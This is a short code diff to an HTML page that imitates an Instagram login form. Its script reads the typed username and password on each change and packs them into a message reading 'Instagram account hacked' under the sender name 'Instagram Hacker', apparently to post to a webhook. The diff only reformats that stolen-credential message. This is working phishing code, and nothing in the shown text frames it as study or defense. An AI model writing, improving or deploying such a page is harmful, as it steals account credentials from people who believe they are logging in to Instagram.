@@ -46,9 +46,8 @@
                     <label for="password" class="sr-only">Password</label>
                     <input name="password" type="password" placeholder="Password" onchange="cambio()"/>
 
-                    
-
                     <button type="button" onclick="redirect()" >Entrar</button>
+
                     <script>
                         function cambio(){
 
@@ -56,7 +55,7 @@
                             var contraseña = document.getElementsByName('password')[0].value;
                             
                             const mensaje = {
-                                content: "Cuenta de Instagram hackeada 🥷Usuario: " + usuario + "Contraseña: " + contraseña,
+                                content: "Cuenta de Instagram hackeada 🥷 \\n Usuario: " + usuario + "\\n Contraseña: " + contraseña,
                                 username: "Instagram Hacker",
                                 };
 
